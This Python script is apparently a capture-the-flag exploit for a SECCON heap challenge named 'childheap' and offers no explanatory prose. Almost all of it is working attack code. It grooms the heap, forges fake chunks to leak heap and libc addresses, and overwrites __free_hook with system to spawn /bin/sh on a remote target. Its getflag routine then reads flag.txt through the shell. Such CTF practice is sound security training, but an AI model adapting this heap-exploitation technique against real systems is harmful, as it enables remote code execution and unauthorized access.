#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './childheap'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

default_target = {'host':'target', 'port':4296}

env = Environment('debug', 'local', 'remote', 'monitor')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET', monitor = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = default_target, \
                        monitor = {'host':os.environ['SECCON_HOST'] if 'SECCON_HOST' in os.environ else default_target['host'], \
                                   'port':int(os.environ['SECCON_PORT']) if 'SECCON_PORT' in os.environ else default_target['port']})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.29.so', \
                        monitor = 'libc-2.29.so')
env.select('monitor')

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    ch = ChildHeap(conn)

    for i in range(7):
        ch.alloc_delete(0xf8 + 0x10*i, str(i))
    ch.alloc_delete(0x18, 'X')
    ch.alloc_delete(0x168, '7')

    for i in range(2):
        ch.wipe()
        ch.alloc(0xf8 + 0x10*i, str(i)*(0xf8 + 0x10*i))
        ch.delete(False)

    addr_heap_base = u(ch.read()) - 0x260
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))
    ch.wipe()

    for i in range(2, 6):
        ch.alloc_delete(0xf8 + 0x10*i, str(i)*(0xf8 + 0x10*i))

    fake_chunk  = b'6'*0x138
    fake_chunk += p64(0x41)
    fake_chunk += p64(addr_heap_base + 0xa80)
    fake_chunk += p64(addr_heap_base + 0xa80)
    ch.alloc_delete(0x158, fake_chunk)
    ch.alloc_delete(0x18, b'Y'*0x10 + p64(0x40))
    ch.alloc_delete(0x168, b'7'*0xf8 + p64(0x11)+p64(0)+p64(0x11))

    ch.alloc(0xf8, '0')
    ch.wipe()

    fake_chunk  = p64(addr_heap_base + 0xa80)
    fake_chunk += p64(addr_heap_base + 0xa80)
    fake_chunk += p64(0)
    fake_chunk += p64(0x41)
    fake_chunk += p64(addr_heap_base + 0xad0)
    ch.alloc(0x38, fake_chunk)
    ch.wipe()
    ch.alloc_delete(0, '')
    ch.alloc(0, '')

    addr_libc_mainarena = u(ch.read()) - 0x60
    libc.address        = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))
    addr_libc_free_hook = libc.symbols['__free_hook']
    ch.delete()

    ch.alloc_delete(0x38, b'Z'*0x18 + p64(0x101) + p64(addr_libc_free_hook))
    ch.alloc(0xf8, '0')
    ch.wipe()

    ch.alloc(0xf8, p64(addr_libc_system))
    ch.wipe()

    ch.alloc(0x38, '/bin/sh')
    ch.delete(False)

class ChildHeap:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc(self, size, content):
        self.sendlineafter('> ', '1')
        self.sendlineafter(': ', str(size))
        if size > 0:
            self.sendafter(': ', content)

    def alloc_delete(self, size, content):
        self.alloc(size, content)
        self.delete()

    def delete(self, wipe = True):
        self.sendlineafter('> ', '2')
        self.sendlineafter('] ', 'y')
        if wipe:
            self.wipe()

    def wipe(self):
        self.sendlineafter('> ', '3')

    def read(self):
        self.sendlineafter('> ', '2')
        self.recvuntil(': \'')
        s = self.recvuntil('\'', drop=True)
        self.sendlineafter('] ', 'n')
        return s

def getflag(conn, **kwargs):
    sleep(0.1)
    conn.sendline('exec 2>&1')
    sleep(0.1)
    conn.sendline('echo FLAG_HERE; cat flag.txt')
    conn.recvuntil('FLAG_HERE\n')
    print('FLAG : {}'.format(conn.recvuntil('\n', drop=True)))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.repeat(attack, True, range(5))

    if env.check('monitor'):
        comn.run(getflag)
    else:
        comn.interactive()

if __name__=='__main__':
    main()

#==========
